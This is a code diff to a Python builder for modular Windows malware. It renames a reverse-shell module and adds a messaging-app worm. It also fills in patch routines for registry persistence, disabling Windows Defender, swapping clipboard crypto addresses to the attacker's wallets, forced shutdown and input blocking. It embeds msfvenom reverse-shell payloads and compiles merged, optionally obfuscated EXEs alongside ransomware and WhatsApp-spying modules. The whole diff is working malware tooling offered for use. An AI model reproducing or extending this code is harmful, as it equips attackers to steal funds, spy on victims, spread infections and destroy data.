@@ -12,16 +12,17 @@ MODULES = {
     'daemon/gremlin': {'desc': 'Hijacks clipboard crypto addresses'},
     'daemon/blackice': {'desc': 'Blacks out the screen to disrupt user activity'},
     'daemon/logicbomb': {'desc': 'Blocks input and triggers DoS on the target'},
-    'daemon/flatline': {'desc': 'Provides a reverse shell for remote access'},
+    'daemon/silverhandghost': {'desc': 'Provides a reverse shell for remote access'},
     'daemon/krash': {'desc': 'Wipes data and crashes the system using ransomware'},
-    'daemon/overwatch': {'desc': 'Monitors all victims chats'},
+    'daemon/overwatch': {'desc': 'Monitors all victims Whatsapp chats'},
+    'daemon/bartmossbrainworm': {'desc': 'A worm that spreads itself through messaging apps'},
 }
 
 MODULE_CHAIN = []
 
 BUILD_OPTIONS = {
-    'exe_name': 'payload.exe',
-    'obfuscate': False,
+    'EXE_NAME': 'payload.exe',
+    'OBFUSCATE': False,
 }
 
 MODULE_OPTIONS = {
@@ -42,7 +43,7 @@ MODULE_OPTIONS = {
         'BLOCK_INPUT': 'true',
         'TRIGGER_DELAY': '10',
     },
-    'daemon/flatline': {
+    'daemon/silverhandghost': {
         'LHOST': '0.0.0.0',
         'LPORT': '4444',
         'KEY': 'changeme',
@@ -51,6 +52,9 @@ MODULE_OPTIONS = {
         'NOTE': 'Your ransom note here',
     },
     'daemon/overwatch': {},
+    'daemon/bartmossbrainworm': {
+        'MESSAGE': 'Hello from BartmossBrainworm!'
+    },
 }
 
 COMMANDS = ['use', 'build', 'clear', 'delete', 'show modules', 'show options', 'exit', 'set']
@@ -178,8 +182,8 @@ def restore_krash_go(original_lines):
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
-def patch_flatline_base64(exe_path):
-    go_path = os.path.join('DAEMONS', 'flatline.go')
+def patch_silverhandghost_base64(exe_path):
+    go_path = os.path.join('DAEMONS', 'silverhandghost.go')
     with open(exe_path, 'rb') as f:
         b64 = base64.b64encode(f.read()).decode()
     with open(go_path, 'r') as f:
@@ -192,39 +196,122 @@ def patch_flatline_base64(exe_path):
                 f.write(line)
     return lines 
 
-def restore_flatline_go(original_lines):
-    go_path = os.path.join('DAEMONS', 'flatline.go')
+def restore_silverhandghost_go(original_lines):
+    go_path = os.path.join('DAEMONS', 'silverhandghost.go')
     with open(go_path, 'w') as f:
         f.writelines(original_lines)
 
 def patch_hellhound_options(persistence, defender_exclude):
-    return None
+    go_path = os.path.join('DAEMONS', 'hellhound.go')
+    with open(go_path, 'r') as f:
+        lines = f.readlines()
+    new_lines = []
+    for line in lines:
+        # Persistence: registry key
+        if "Set-ItemProperty -Path 'HKCU:Software" in line:
+            if persistence.lower() in ("true", "1", "yes", "on"):
+                new_lines.append(line.lstrip('#'))
+            else:
+                if not line.lstrip().startswith('#'):
+                    new_lines.append('#' + line)
+                else:
+                    new_lines.append(line)
+        # Defender exclusion
+        elif "Add-MpPreference -ExclusionPath" in line or "Set-MpPreference -DisableRealtimeMonitoring" in line:
+            if defender_exclude.lower() in ("true", "1", "yes", "on"):
+                new_lines.append(line.lstrip('#'))
+            else:
+                if not line.lstrip().startswith('#'):
+                    new_lines.append('#' + line)
+                else:
+                    new_lines.append(line)
+        else:
+            new_lines.append(line)
+    with open(go_path, 'w') as f:
+        f.writelines(new_lines)
+    return lines
 
 def restore_hellhound_go(original_lines):
-    pass
+    go_path = os.path.join('DAEMONS', 'hellhound.go')
+    with open(go_path, 'w') as f:
+        f.writelines(original_lines)
 
 def patch_gremlin_addresses(btc_address, eth_address, bep20_address, sol_address):
-    return None
+    go_path = os.path.join('DAEMONS', 'gremlin.go')
+    with open(go_path, 'r') as f:
+        lines = f.readlines()
+    new_lines = []
+    for line in lines:
+        if 'predefinedBitcoinAddress' in line:
+            new_lines.append(f'\tpredefinedBitcoinAddress  = "{btc_address}"\n')
+        elif 'predefinedEthereumAddress' in line:
+            new_lines.append(f'\tpredefinedEthereumAddress = "{eth_address}"\n')
+        elif 'predefinedBEP20Address' in line:
+            new_lines.append(f'\tpredefinedBEP20Address    = "{bep20_address}"\n')
+        elif 'predefinedSolanaAddress' in line:
+            new_lines.append(f'\tpredefinedSolanaAddress   = "{sol_address}"\n')
+        else:
+            new_lines.append(line)
+    with open(go_path, 'w') as f:
+        f.writelines(new_lines)
+    return lines
 
 def restore_gremlin_go(original_lines):
-    pass
+    go_path = os.path.join('DAEMONS', 'gremlin.go')
+    with open(go_path, 'w') as f:
+        f.writelines(original_lines)
 
 def patch_blackice_options(duration):
-    return None
+    go_path = os.path.join('DAEMONS', 'blackice.go')
+    with open(go_path, 'r') as f:
+        lines = f.readlines()
+    new_lines = []
+    for line in lines:
+        if '"/t",' in line:
+            new_lines.append(f'\tcmd := exec.Command("shutdown", "/s", "/t", "{duration}")\n')
+        else:
+            new_lines.append(line)
+    with open(go_path, 'w') as f:
+        f.writelines(new_lines)
+    return lines
 
 def restore_blackice_go(original_lines):
-    pass
+    go_path = os.path.join('DAEMONS', 'blackice.go')
+    with open(go_path, 'w') as f:
+        f.writelines(original_lines)
 
 def patch_logicbomb_options(block_input, trigger_delay):
-    return None
+    go_path = os.path.join('DAEMONS', 'logicbomb.go')
+    with open(go_path, 'r') as f:
+        lines = f.readlines()
+    new_lines = []
+    for line in lines:
+        if 'blockInput.Call(1)' in line:
+            if block_input.lower() in ("true", "1", "yes", "on"):
+                new_lines.append(line.lstrip('#'))
+            else:
+                if not line.lstrip().startswith('#'):
+                    new_lines.append('#' + line)
+                else:
+                    new_lines.append(line)
+        elif 'time.Sleep(' in line and '*' in line:
+            # This is the sleep in the loop
+            new_lines.append(f'\t\ttime.Sleep({trigger_delay} * time.Second)\n')
+        else:
+            new_lines.append(line)
+    with open(go_path, 'w') as f:
+        f.writelines(new_lines)
+    return lines
 
 def restore_logicbomb_go(original_lines):
-    pass
+    go_path = os.path.join('DAEMONS', 'logicbomb.go')
+    with open(go_path, 'w') as f:
+        f.writelines(original_lines)
 
-def patch_flatline_options(lhost, lport, key):
+def patch_silverhandghost_options(lhost, lport, key):
     return None
 
-def restore_flatline_go(original_lines):
+def restore_silverhandghost_go(original_lines):
     pass
 
 def patch_overwatch_options():
@@ -232,6 +319,28 @@ def patch_overwatch_options():
 
 def restore_overwatch_go(original_lines):
     pass
+
+def patch_bartmossbrainworm_message(message):
+    go_path = os.path.join('DAEMONS', 'bartmossbrainworm.go')
+    with open(go_path, 'r') as f:
+        lines = f.readlines()
+    with open(go_path, 'w') as f:
+        for line in lines:
+            if 'predefinedMessage :=' in line or 'predefinedMessage :=' in line:
+                f.write(f'\tpredefinedMessage := "{message}"\n')
+            elif 'predefinedMessage :=' not in line and 'predefinedMessage :=' not in line and 'predefinedMessage' in line and '="' in line:
+                # fallback for any other assignment
+                f.write(f'\tpredefinedMessage := "{message}"\n')
+            elif 'predefinedMessage' in line and 'Hello from Rod!' in line:
+                f.write(f'\tpredefinedMessage := "{message}"\n')
+            else:
+                f.write(line)
+    return lines
+
+def restore_bartmossbrainworm_go(original_lines):
+    go_path = os.path.join('DAEMONS', 'bartmossbrainworm.go')
+    with open(go_path, 'w') as f:
+        f.writelines(original_lines)
 
 def shell():
     current_module = None
@@ -279,27 +388,29 @@ def shell():
                         
                         go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
                         krash_original = None
-                        flatline_original = None
+                        silverhandghost_original = None
                         hellhound_original = None
                         gremlin_original = None
                         blackice_original = None
                         logicbomb_original = None
                         overwatch_original = None
+                        bartmossbrainworm_original = None
                         
                         if modname == 'daemon/krash':
                             note = MODULE_OPTIONS.get('daemon/krash', {}).get('NOTE', 'YOUR NOTE HERE')
                             krash_original = patch_krash_note(note)
-                        elif modname == 'daemon/flatline':
-                            opts = MODULE_OPTIONS.get('daemon/flatline', {})
+                        elif modname == 'daemon/silverhandghost':
+                            opts = MODULE_OPTIONS.get('daemon/silverhandghost', {})
                             lhost = opts.get('LHOST', '0.0.0.0')
                             lport = opts.get('LPORT', '4444')
-                            payload_path = os.path.join('.LOOT', 'flatline_payload.exe')
+                            key = opts.get('KEY', 'changeme')
+                            payload_path = os.path.join('.LOOT', 'silverhandghost_payload.exe')
                             try:
                                 generate_msfvenom_exe(lhost, lport, payload_path)
                             except Exception as e:
                                 output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                 continue
-                            flatline_original = patch_flatline_base64(payload_path)
+                            silverhandghost_original = patch_silverhandghost_base64(payload_path)
                         elif modname == 'daemon/hellhound':
                             opts = MODULE_OPTIONS.get('daemon/hellhound', {})
                             persistence = opts.get('PERSISTENCE', 'true')
@@ -323,6 +434,9 @@ def shell():
                             logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
                         elif modname == 'daemon/overwatch':
                             overwatch_original = patch_overwatch_options()
+                        elif modname == 'daemon/bartmossbrainworm':
+                            message = MODULE_OPTIONS.get('daemon/bartmossbrainworm', {}).get('MESSAGE', 'Hello from BartmossBrainworm!')
+                            bartmossbrainworm_original = patch_bartmossbrainworm_message(message)
                         
                         module_name = modname.split('/')[-1]
                         final_name = f"{module_name}.exe"
@@ -330,7 +444,7 @@ def shell():
                         
                         output_lines.append(f"[*] Building single module: {final_name}")
                         obf_flag = []
-                        if BUILD_OPTIONS.get('obfuscate'):
+                        if BUILD_OPTIONS.get('OBFUSCATE'):
                             obf_flag = ['--obfuscate']
                         
                         from loading import loading_state
@@ -344,8 +458,8 @@ def shell():
                         
                         if krash_original:
                             restore_krash_go(krash_original)
-                        if flatline_original:
-                            restore_flatline_go(flatline_original)
+                        if silverhandghost_original:
+                            restore_silverhandghost_go(silverhandghost_original)
                         if hellhound_original:
                             restore_hellhound_go(hellhound_original)
                         if gremlin_original:
@@ -356,34 +470,38 @@ def shell():
                             restore_logicbomb_go(logicbomb_original)
                         if overwatch_original:
                             restore_overwatch_go(overwatch_original)
+                        if bartmossbrainworm_original:
+                            restore_bartmossbrainworm_go(bartmossbrainworm_original)
                         
                         MODULE_CHAIN.clear()
                     else:
                         output_lines.append(f"Building merged malware with {len(MODULE_CHAIN)} modules...")
                         go_paths = []
                         krash_original = None
-                        flatline_original = None
+                        silverhandghost_original = None
                         hellhound_original = None
                         gremlin_original = None
                         blackice_original = None
                         logicbomb_original = None
                         overwatch_original = None
+                        bartmossbrainworm_original = None
                         for modname in MODULE_CHAIN:
                             go_path = modname.replace('daemon/', 'DAEMONS/') + '.go'
                             if modname == 'daemon/krash':
                                 note = MODULE_OPTIONS.get('daemon/krash', {}).get('NOTE', 'YOUR NOTE HERE')
                                 krash_original = patch_krash_note(note)
-                            if modname == 'daemon/flatline':
-                                opts = MODULE_OPTIONS.get('daemon/flatline', {})
+                            if modname == 'daemon/silverhandghost':
+                                opts = MODULE_OPTIONS.get('daemon/silverhandghost', {})
                                 lhost = opts.get('LHOST', '0.0.0.0')
                                 lport = opts.get('LPORT', '4444')
-                                payload_path = os.path.join('.LOOT', 'flatline_payload.exe')
+                                key = opts.get('KEY', 'changeme')
+                                payload_path = os.path.join('.LOOT', 'silverhandghost_payload.exe')
                                 try:
                                     generate_msfvenom_exe(lhost, lport, payload_path)
                                 except Exception as e:
                                     output_lines.append(f"Failed to generate msfvenom payload: {e}")
                                     continue
-                                flatline_original = patch_flatline_base64(payload_path)
+                                silverhandghost_original = patch_silverhandghost_base64(payload_path)
                             if modname == 'daemon/hellhound':
                                 opts = MODULE_OPTIONS.get('daemon/hellhound', {})
                                 persistence = opts.get('PERSISTENCE', 'true')
@@ -407,12 +525,15 @@ def shell():
                                 logicbomb_original = patch_logicbomb_options(block_input, trigger_delay)
                             if modname == 'daemon/overwatch':
                                 overwatch_original = patch_overwatch_options()
+                            if modname == 'daemon/bartmossbrainworm':
+                                message = MODULE_OPTIONS.get('daemon/bartmossbrainworm', {}).get('MESSAGE', 'Hello from BartmossBrainworm!')
+                                bartmossbrainworm_original = patch_bartmossbrainworm_message(message)
                             go_paths.append(go_path)
-                        final_name = BUILD_OPTIONS['exe_name']
+                        final_name = BUILD_OPTIONS['EXE_NAME']
                         final_path = os.path.abspath(os.path.join(loot_dir, final_name))
                         output_lines.append(f"[*] Merging Go modules into final EXE: {final_name}")
                         obf_flag = []
-                        if BUILD_OPTIONS.get('obfuscate'):
+                        if BUILD_OPTIONS.get('OBFUSCATE'):
                             obf_flag = ['--obfuscate']
                         from loading import loading_state
                         with loading_state(message="Building, please wait...", print_ascii_art=print_ascii_art):
@@ -423,8 +544,8 @@ def shell():
                             output_lines.append("Failed to create merged EXE.")
                         if krash_original:
                             restore_krash_go(krash_original)
-                        if flatline_original:
-                            restore_flatline_go(flatline_original)
+                        if silverhandghost_original:
+                            restore_silverhandghost_go(silverhandghost_original)
                         if hellhound_original:
                             restore_hellhound_go(hellhound_original)
                         if gremlin_original:
@@ -435,6 +556,8 @@ def shell():
                             restore_logicbomb_go(logicbomb_original)
                         if overwatch_original:
                             restore_overwatch_go(overwatch_original)
+                        if bartmossbrainworm_original:
+                            restore_bartmossbrainworm_go(bartmossbrainworm_original)
                         MODULE_CHAIN.clear()
             elif cmd == 'clear':
                 MODULE_CHAIN.clear()
@@ -492,21 +615,23 @@ def shell():
                         if mod in MODULE_OPTIONS and opt in MODULE_OPTIONS[mod]:
                             MODULE_OPTIONS[mod][opt] = val
                             output_lines.append(f"Set {opt} to {val} for {mod}")
-                        elif opt in BUILD_OPTIONS:
-                            if opt == 'obfuscate':
-                                BUILD_OPTIONS[opt] = val.lower() in ('1', 'true', 'yes', 'on')
+                            if mod == 'daemon/bartmossbrainworm' and opt == 'MESSAGE':
+                                patch_bartmossbrainworm_message(val)
+                        elif opt.upper() in BUILD_OPTIONS:
+                            if opt.upper() == 'OBFUSCATE':
+                                BUILD_OPTIONS[opt.upper()] = val.lower() in ('1', 'true', 'yes', 'on')
                             else:
-                                BUILD_OPTIONS[opt] = val
-                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt]}")
+                                BUILD_OPTIONS[opt.upper()] = val
+                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt.upper()]}")
                         else:
                             output_lines.append(f"Unknown option: {opt}")
                     else:
-                        if opt in BUILD_OPTIONS:
-                            if opt == 'obfuscate':
-                                BUILD_OPTIONS[opt] = val.lower() in ('1', 'true', 'yes', 'on')
+                        if opt.upper() in BUILD_OPTIONS:
+                            if opt.upper() == 'OBFUSCATE':
+                                BUILD_OPTIONS[opt.upper()] = val.lower() in ('1', 'true', 'yes', 'on')
                             else:
-                                BUILD_OPTIONS[opt] = val
-                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt]}")
+                                BUILD_OPTIONS[opt.upper()] = val
+                            output_lines.append(f"Set {opt} to {BUILD_OPTIONS[opt.upper()]}")
                         else:
                             output_lines.append(f"Unknown option: {opt}")
             elif cmd in ('exit', 'quit'):
